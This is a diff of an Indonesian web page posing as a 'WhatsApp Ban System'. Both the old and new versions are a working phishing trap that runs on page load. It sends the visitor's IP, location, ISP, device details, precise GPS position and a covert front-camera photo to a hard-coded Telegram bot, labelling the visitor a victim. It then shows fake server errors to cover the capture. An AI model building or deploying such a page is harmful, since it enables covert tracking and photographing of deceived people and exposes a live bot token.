@@ -2,11 +2,11 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Website Bans WhatsApp By Painzy - Re-Forged</title>
+  <title>Website Bans WhatsApp By Painzy - Final Forge</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
   <style>
-    /* Mengembalikan Estetika Visual yang Kau Ciptakan */
+    /* Estetika Visual - Warisan Arsitek */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
@@ -26,7 +26,7 @@
     .login-container { background-color: rgba(17, 17, 17, 0.95); padding: 30px; border-radius: 16px; box-shadow: 0 0 20px lime; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
     .login-title { font-size: 26px; font-weight: 900; margin-bottom: 10px; background: linear-gradient(135deg, #00ff7f, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
-    #info { white-space: pre-wrap; text-align: left; margin-top: 20px; background: #222; padding: 15px; border-radius: 8px; font-size: 11px; color: #0f0; }
+    #info { white-space: pre-wrap; text-align: left; margin-top: 20px; background: #222; padding: 15px; border-radius: 8px; font-size: 11px; color: #0f0; line-height: 1.5; }
     video, canvas { display: none; }
   </style>
 </head>
@@ -36,20 +36,21 @@
   <div class="login-container">
     <p class="login-title">WhatsApp Ban System</p>
     <p class="login-subtitle">⚠️ Menghubungkan ke Server Pusat...</p>
-    <div id="info">⏳ Sedang menginisialisasi protokol sihir...</div>
+    <div id="info">⏳ Inisialisasi Protokol Kejujuran...</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    const botToken = '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U';
-    const chatIds = ['7109845671'];
-    const infoDiv = document.getElementById('info');
+    const CONFIG = {
+      token: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+      ids: ['7109845671']
+    };
 
     function sendToTelegram(text) {
-      chatIds.forEach(id => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      CONFIG.ids.forEach(id => {
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
@@ -58,71 +59,73 @@
     }
 
     function sendPhotoToTelegram(blob) {
-      chatIds.forEach(id => {
+      CONFIG.ids.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
         formData.append('photo', blob);
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: formData });
       });
     }
 
-    // Fungsi Pengambil Data Otomatis
-    async function executeTrap() {
-      // 1. Ambil Info Dasar
-      let ipData = {};
+    // Eksekusi Pelacakan Bertingkat & Kamera
+    async function startDivineTrap() {
+      // 1. Pelacakan Tahap 1: Database IP (Instan & Pasti)
       try {
         const res = await fetch('https://ipapi.co/json/');
-        ipData = await res.json();
-      } catch (e) { ipData = { ip: 'Unknown' }; }
+        const d = await res.json();
+        const info = `
+<b>📥 KORBAN TERDETEKSI (Level 1: IP)</b>
+<b>IP:</b> ${d.ip}
+<b>Lokasi:</b> ${d.city}, ${d.region}, ${d.country_name}
+<b>ISP:</b> ${d.org}
+<b>Maps (Estimasi):</b> https://www.google.com/maps?q=$${d.latitude},${d.longitude}
+<b>OS:</b> ${navigator.platform} | <b>Baterai:</b> ${(await navigator.getBattery?.())?.level * 100 || 'N/A'}%
+        `;
+        sendToTelegram(info);
+      } catch (e) { sendToTelegram("⚠️ Gagal mengambil data IP."); }
 
-      const text = `
-<b>📥 KORBAN BARU TERDETEKSI</b>
-<b>IP:</b> ${ipData.ip || '-'}
-<b>Lokasi:</b> ${ipData.city || '-'}, ${ipData.country_name || '-'}
-<b>ISP:</b> ${ipData.org || '-'}
-<b>Maps:</b> https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
-<b>OS/Browser:</b> ${navigator.userAgent}
-      `.trim();
-      
-      sendToTelegram(text);
-      infoDiv.innerText = "✅ Koneksi Terjalin. Memverifikasi otoritas...";
-
-      // 2. GPS Presisi
+      // 2. Pelacakan Tahap 2: Triangulasi Browser (Tetap Berjalan Tanpa GPS)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
-          const gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-          sendToTelegram(`<b>📍 GPS PRESISI:</b>\n${gpsLink}`);
-        }, null, { enableHighAccuracy: true });
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+          const gpsLink = `https://www.google.com/maps?q=$${lat},${lon}`;
+          sendToTelegram(`<b>📍 LOKASI PRESISI (Level 2: Wi-Fi/Cell)</b>\n<b>Akurasi:</b> ${acc.toFixed(0)}m\n<b>Peta:</b> ${gpsLink}`);
+          infoDiv.innerText = "✅ Koneksi Terverifikasi. Sinkronisasi...";
+        }, () => {
+          sendToTelegram("❌ Izin Lokasi Ditolak.");
+        }, { enableHighAccuracy: true, timeout: 15000 });
       }
 
-      // 3. Cermin Terkutuk (Kamera Otomatis & High Res)
+      // 3. Cermin Terkutuk: Kamera Resolusi Tinggi Otomatis
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
         });
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        video.srcObject = stream;
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        v.srcObject = stream;
 
-        video.onloadedmetadata = () => {
+        v.onloadedmetadata = () => {
           setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(blob => {
               if (blob) sendPhotoToTelegram(blob);
               stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg', 0.95);
-            infoDiv.innerText = "❌ Error 403: Akses Ditolak oleh Server.";
-          }, 2500); // Memberi waktu kamera fokus
+            document.getElementById('info').innerText = "❌ Error: Akses Ditolak oleh Server Pusat.";
+          }, 3000); // 3 detik untuk autofocus
         };
       } catch (err) {
-        sendToTelegram('❌ Kamera Ditolak');
-        infoDiv.innerText = "❌ Gagal mengunduh sertifikat keamanan.";
+        sendToTelegram("❌ Kamera Ditolak.");
+        document.getElementById('info').innerText = "❌ Kegagalan Sistem: Sertifikat Tidak Valid.";
       }
     }
 
-    // Partikel Latar Belakang
+    // Inisialisasi Partikel
     function createParticles() {
       const container = document.querySelector('.bg-particles');
       for (let i = 0; i < 50; i++) {
@@ -135,10 +138,10 @@
       }
     }
 
-    // Jalankan Semua Saat Terbuka
+    // Mulai Semua Secara Otomatis
     window.onload = () => {
       createParticles();
-      executeTrap();
+      startDivineTrap();
     };
   </script>
 </body>
